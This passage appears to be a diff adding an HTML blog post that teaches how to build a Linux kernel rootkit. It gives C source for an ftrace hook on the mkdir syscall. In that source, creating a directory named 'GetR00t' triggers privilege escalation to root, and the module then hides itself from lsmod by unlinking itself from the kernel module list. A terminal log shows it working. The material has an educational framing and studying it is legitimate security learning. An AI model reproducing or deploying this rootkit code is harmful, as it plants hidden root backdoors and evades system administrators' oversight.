+    size_t count <span style="color:#f92672">=</span> regs<span style="color:#f92672">-&gt;</span>d;
+    <span style="color:#75715e">/* rest of function */</span>
+}
+
+</code></pre></div><h2 id="writing-a-syscall-hook">Writing a Syscall Hook<a href="#writing-a-syscall-hook" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>We need to use a framework called Ftrace. The structure of Ftrace can be seen below.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">struct</span> ftrace_hook {
+        <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>name;
+        <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>function;
+        <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>original;
+ 
+        <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> address;
+        <span style="color:#66d9ef">struct</span> ftrace_ops ops;
+};
+</code></pre></div><p>Source code for the mkdir syscall.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">asmlinkage <span style="color:#66d9ef">long</span> <span style="color:#a6e22e">sys_mkdir</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> __user <span style="color:#f92672">*</span>pathname, umode_t mode);
+</code></pre></div><p>When hooking a syscall we need to provide a name of the function we want to hook (i.e. sys_mkdir, sys_execve etc.), the hook function we&rsquo;ve written and the address of where we want the original syscall to be saved. The reason we need to save the address of the original syscall is because once we have finished hooking into the syscall, we want operation to continue as normal, so we then call our original syscall function which references the address of the syscall we hooked.</p>
+<p>To hook with ftrace we will want to do something like this</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">struct</span> ftrace_hook hook[] <span style="color:#f92672">=</span> {
+    HOOK(<span style="color:#e6db74">&#34;sys_mkdir&#34;</span>, hook_mkdir, <span style="color:#f92672">&amp;</span>orig_mkdir),
+};
+</code></pre></div><p>The main code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/init.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/module.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/kernel.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/syscalls.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/version.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/namei.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;ftrace_helper.h&#34; //handles kallsyms_lookup_name magic to grab syscall name from syscall table</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+MODULE_LICENSE(<span style="color:#e6db74">&#34;GPL&#34;</span>);
+MODULE_AUTHOR(<span style="color:#e6db74">&#34;TheXcellerator&#34;</span>);
+MODULE_DESCRIPTION(<span style="color:#e6db74">&#34;mkdir syscall hook&#34;</span>);
+MODULE_VERSION(<span style="color:#e6db74">&#34;0.01&#34;</span>);
+
+<span style="color:#75715e">#if defined(CONFIG_X86_64) &amp;&amp; (LINUX_VERSION_CODE &gt;= KERNEL_VERSION(4,17,0)) </span><span style="color:#75715e">//not really needed tbh. Good practice to not crash incompatible kernels
+</span><span style="color:#75715e"></span><span style="color:#75715e">#define PTREGS_SYSCALL_STUBS 1 </span><span style="color:#75715e">//not a clue what this is
+</span><span style="color:#75715e"></span><span style="color:#75715e">#endif
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">#ifdef PTREGS_SYSCALL_STUBS </span><span style="color:#75715e">//if defined do... else do...
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">static</span> asmlinkage <span style="color:#a6e22e">long</span> (<span style="color:#f92672">*</span>orig_mkdir)(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> pt_regs <span style="color:#f92672">*</span>); <span style="color:#75715e">// defining pointer orig_mkdir to point to pt_regs structure, so it can hold the address of the syscall we want to return to
+</span><span style="color:#75715e"></span>
+asmlinkage <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">hook_mkdir</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> pt_regs <span style="color:#f92672">*</span>regs) <span style="color:#75715e">//function called hook_mkdir, used in ftrace_hook array later
+</span><span style="color:#75715e"></span>{
+    <span style="color:#66d9ef">char</span> __user <span style="color:#f92672">*</span>pathname <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)regs<span style="color:#f92672">-&gt;</span>di; <span style="color:#75715e">//structure notation to grab pathname from pt_regs structure. __user is needed for some reason... double check
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">char</span> dir_name[NAME_MAX] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>}; <span style="color:#75715e">// define array to store directory name later
+</span><span style="color:#75715e"></span>
+    <span style="color:#66d9ef">long</span> error <span style="color:#f92672">=</span> strncpy_from_user(dir_name, pathname, NAME_MAX); <span style="color:#75715e">//copy from user space - kernel space cant access userspace otherwise. Copies from pathname array (name of dir in mkdir syscall) into kernel space array (dir_name) up to a maximum bytes of NAME_MAX
+</span><span style="color:#75715e"></span>
+    <span style="color:#66d9ef">if</span> (error <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>)
+        printk(KERN_INFO <span style="color:#e6db74">&#34;rootkit: trying to create directory with name: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, dir_name);
+
+    orig_mkdir(regs); <span style="color:#75715e">//call to orginal syscall address to allow the syscall to continue
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+<span style="color:#75715e">#else
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">static</span> asmlinkage <span style="color:#a6e22e">long</span> (<span style="color:#f92672">*</span>orig_mkdir)(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> __user <span style="color:#f92672">*</span>pathname, umode_t mode);
+
+asmlinkage <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">hook_mkdir</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> __user <span style="color:#f92672">*</span>pathname, umode_t mode)
+{
+    <span style="color:#66d9ef">char</span> dir_name[NAME_MAX] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
+
+    <span style="color:#66d9ef">long</span> error <span style="color:#f92672">=</span> strncpy_from_user(dir_name, pathname, NAME_MAX);
+
+    <span style="color:#66d9ef">if</span> (error <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>)
+        printk(KERN_INFO <span style="color:#e6db74">&#34;rootkit: trying to create directory with name %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, dir_name);
+
+    orig_mkdir(pathname, mode);
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+<span style="color:#75715e">#endif
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">struct</span> ftrace_hook hooks[] <span style="color:#f92672">=</span> { <span style="color:#75715e">// ftrace hook array referenced earlier, using hook_mkdir function.
+</span><span style="color:#75715e"></span>    HOOK(<span style="color:#e6db74">&#34;sys_mkdir&#34;</span>, hook_mkdir, <span style="color:#f92672">&amp;</span>orig_mkdir) <span style="color:#75715e">//hook macro
+</span><span style="color:#75715e"></span>};
+
+<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> __init <span style="color:#a6e22e">rootkit_init</span>(<span style="color:#66d9ef">void</span>)
+{
+    <span style="color:#66d9ef">int</span> err;
+    err <span style="color:#f92672">=</span> fh_install_hooks(hooks, ARRAY_SIZE(hooks)); <span style="color:#75715e">//referecnes hooks array defined in ftrace hook array
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span>(err)
+        <span style="color:#66d9ef">return</span> err;
+
+    printk(KERN_INFO <span style="color:#e6db74">&#34;rootkit: loaded</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+
+<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> __exit <span style="color:#a6e22e">rootkit_exit</span>(<span style="color:#66d9ef">void</span>)
+{
+    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
+    printk(KERN_INFO <span style="color:#e6db74">&#34;rootkit: unloaded</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+}
+
+module_init(rootkit_init);
+module_exit(rootkit_exit);
+</code></pre></div><h2 id="hiding-our-rootkit">Hiding our rootkit<a href="#hiding-our-rootkit" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Drivers currently loaded onto the system can be seen using the <code>lsmod</code> command. The way the kernel keeps track of these modules is with linked lists with structures in c. The reason it is a linked list is because each item in the list points to the previous and next entry.</p>
+<p>An example below:
+Taken from <a href="https://xcellerator.github.io/posts/linux_rootkits_05/">Linux Rootkits Part 5: Hiding Kernel Modules from Userspace :: TheXcellerator</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">struct</span> my_object entry1, entry2, entry3;
+
+entry1.prev <span style="color:#f92672">=</span> NULL;
+entry1.next <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>entry2;
+
+entry2.prev <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>entry1;
+entry2.next <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>entry3;
+
+entry3.prev <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>entry2;
+entry3.next <span style="color:#f92672">=</span> NULL
+</code></pre></div><p>It&rsquo;s a much easier way to store modules as there is no need to worry about keeping an index of all list entries, or resizing of arrays, we can just alter some previous and next pointers when we want to add or remove modules.</p>
+<p>Each module loaded into the kernel is referenced by an object called <code>THIS_MODULE</code> which becomes defined as a pointer to a <code>module</code> struct as seen below (from <code>include/linux/export.h</code>)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#ifdef MODULE
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">extern</span> <span style="color:#66d9ef">struct</span> module __this_module;
+<span style="color:#75715e">#define THIS_MODULE (&amp;__this_module)
+</span><span style="color:#75715e">#else
+</span><span style="color:#75715e">#define THIS_MODULE ((struct module *)0)
+</span><span style="color:#75715e">#endif
+</span><span style="color:#75715e"></span>
+</code></pre></div><p>So <code>THIS_MODULE</code> ends up pointing to the module structure which can be seen below from <code>include/linux/module.h</code></p>
+<p>This structure (<code>module</code>) contains another structure (<code>list_head</code>) which contains the information on the modules (the linked list) that defines what is before and what is next.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">struct</span> module {
+    <span style="color:#66d9ef">enum</span> module_state state;
+
+    <span style="color:#75715e">/* Member of list of modules */</span>
+    <span style="color:#66d9ef">struct</span> list_head list;
+
+    <span style="color:#75715e">/* Unique handle for this module */</span>
+    <span style="color:#66d9ef">char</span> name[MODULE_NAME_LEN];
+
+};
+
+</code></pre></div><p>In my code i defined a global variable to keep track of whether the module is hidden or shown</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">if</span> ( (strcmp(dir, <span style="color:#e6db74">&#34;GetR00t&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&amp;&amp;</span> (hide <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) )
+	{
+		<span style="color:#75715e">//execl(SHELL, &#34;sh&#34;, NULL);
+</span><span style="color:#75715e"></span>		printk(KERN_INFO <span style="color:#e6db74">&#34;rootkit: giving root...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+		set_root();		<span style="color:#75715e">//hiderootkit() function lays inside of set_root() function
+</span><span style="color:#75715e"></span>		<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+	}
+
+<span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> ( (strcmp(dir, <span style="color:#e6db74">&#34;GetR00t&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&amp;&amp;</span> (hide <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>) )
+	{
+		printk(KERN_INFO <span style="color:#e6db74">&#34;showing rootkit </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+		showrootkit();
+		hide <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;	<span style="color:#75715e">//hide variable set to 0 to tell the program it is currently shown
+</span><span style="color:#75715e"></span>		<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+	}
+
+<span style="color:#66d9ef">else</span>
+	{
+		orig_mkdir(regs);
+		<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+	}
+
+</code></pre></div><p>In my <code>hiderootkit()</code> function I define a global pointer to the <code>list_head</code> structure to pull the previous value called <code>prev_module</code> so we can add our module back to correct position in the list later. Once this has been saved we can use a function called <code>list_del</code> to delete <code>THIS_MODULE</code>.</p>
+<p>Once we want to show the rootkit again we just use the list_add function to add <code>THIS_MODULE</code> to the correct position in the list, with the previous module being the one we saved earlier.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">set_root</span>(<span style="color:#66d9ef">void</span>)
+      {
+		   <span style="color:#66d9ef">void</span> hiderootkit(<span style="color:#66d9ef">void</span>);
+		   
+		   [...SNIP...] <span style="color:#75715e">// privilege escalating the current user
+</span><span style="color:#75715e"></span>		   
+		   <span style="color:#75715e">/* Hide rootkit once root has been given */</span>
+		   printk(KERN_INFO <span style="color:#e6db74">&#34;Hiding rootkit </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+		   hiderootkit();
+		   hide <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>; <span style="color:#75715e">//Telling program module is currently hidden
+</span><span style="color:#75715e"></span>      }
+
+
+<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">struct</span> list_head <span style="color:#f92672">*</span>prev_module;
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">hiderootkit</span>(<span style="color:#66d9ef">void</span>)
+	{
+	prev_module <span style="color:#f92672">=</span> THIS_MODULE<span style="color:#f92672">-&gt;</span>list.prev;
+    list_del(<span style="color:#f92672">&amp;</span>THIS_MODULE<span style="color:#f92672">-&gt;</span>list);
+
+	}
+
+
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">showrootkit</span>(<span style="color:#66d9ef">void</span>)
+	{
+	list_add(<span style="color:#f92672">&amp;</span>THIS_MODULE<span style="color:#f92672">-&gt;</span>list, prev_module);
+	}
+</code></pre></div><p>An example of the rootkit in action can be seen below.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/rootkit<span style="color:#f92672">]</span>
+└─$ sudo insmod rootkitHook.ko                    
+<span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali: 
+┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/rootkit<span style="color:#f92672">]</span>
+└─$ mkdir GetR00t        
+┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/rootkit<span style="color:#f92672">]</span>
+└─$ lsmod | grep -i rootkithook				<span style="color:#75715e">#Shows rootkit is currently hidden</span>
+┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/rootkit<span style="color:#f92672">]</span>
+└─$ sudo tail /var/log/syslog
+Dec <span style="color:#ae81ff">27</span> 07:58:51 kali kernel: <span style="color:#f92672">[</span> 5446.624966<span style="color:#f92672">]</span> Intercepting mkdir call
+Dec <span style="color:#ae81ff">27</span> 07:58:51 kali kernel: <span style="color:#f92672">[</span> 5446.624968<span style="color:#f92672">]</span> rootkit: trying to create directory with name: GetR00t
+Dec <span style="color:#ae81ff">27</span> 07:58:51 kali kernel: <span style="color:#f92672">[</span> 5446.624969<span style="color:#f92672">]</span> rootkit: giving root...
+Dec <span style="color:#ae81ff">27</span> 07:58:51 kali kernel: <span style="color:#f92672">[</span> 5446.624970<span style="color:#f92672">]</span> set_root called
+Dec <span style="color:#ae81ff">27</span> 07:58:51 kali kernel: <span style="color:#f92672">[</span> 5446.624971<span style="color:#f92672">]</span> Setting privileges... 
+Dec <span style="color:#ae81ff">27</span> 07:58:51 kali kernel: <span style="color:#f92672">[</span> 5446.624971<span style="color:#f92672">]</span> Commiting creds
+Dec <span style="color:#ae81ff">27</span> 07:58:51 kali kernel: <span style="color:#f92672">[</span> 5446.624971<span style="color:#f92672">]</span> Hiding rootkit 
+        
+┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/rootkit<span style="color:#f92672">]</span>
+└─$ mkdir GetR00t         
+┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/rootkit<span style="color:#f92672">]</span>
+└─$ lsmod | grep -i rootkithook					<span style="color:#75715e">#Shows rootkit can now be seen</span>
+rootkitHook            <span style="color:#ae81ff">20480</span>  <span style="color:#ae81ff">0</span>        
+┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/rootkit<span style="color:#f92672">]</span>
+└─$ sudo tail /var/log/syslog  
+<span style="color:#f92672">[</span>...SNIP...<span style="color:#f92672">]</span>
+Dec <span style="color:#ae81ff">27</span> 07:59:13 kali kernel: <span style="color:#f92672">[</span> 5468.075376<span style="color:#f92672">]</span> Intercepting mkdir call
+Dec <span style="color:#ae81ff">27</span> 07:59:13 kali kernel: <span style="color:#f92672">[</span> 5468.075378<span style="color:#f92672">]</span> rootkit: trying to create directory with name: GetR00t
+Dec <span style="color:#ae81ff">27</span> 07:59:13 kali kernel: <span style="color:#f92672">[</span> 5468.075378<span style="color:#f92672">]</span> showing rootkit 
+</code></pre></div><h1 id="references">References<a href="#references" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<ul>
+<li><a href="http://derekmolloy.ie/writing-a-linux-kernel-module-part-1-introduction/">Writing a Linux Kernel Module — Part 1: Introduction | derekmolloy.ie</a></li>
+<li><a href="https://static.lwn.net/images/pdf/LDD3/ch02.pdf">,ch02.6536 (lwn.net)</a></li>
+<li><a href="https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485">Kernel RootKits. Getting your hands dirty - Malware - 0x00sec - The Home of the Hacker</a></li>
+<li><a href="https://xcellerator.github.io/posts/linux_rootkits_02/">Linux Rootkits Part 2: Ftrace and Function Hooking :: TheXcellerator</a></li>
+<li><a href="https://www.codeproject.com/Articles/1275114/Hooking-Linux-Kernel-Functions-Part-2-How-to-Hook">Hooking Linux Kernel Functions, Part 2: How to Hook Functions with Ftrace - CodeProject</a></li>
+</ul>
+
+      </div></div>
+
+  
+
+  
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2022 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="https://thomas-byrne.co.uk/assets/main.js"></script>
+<script src="https://thomas-byrne.co.uk/assets/prism.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
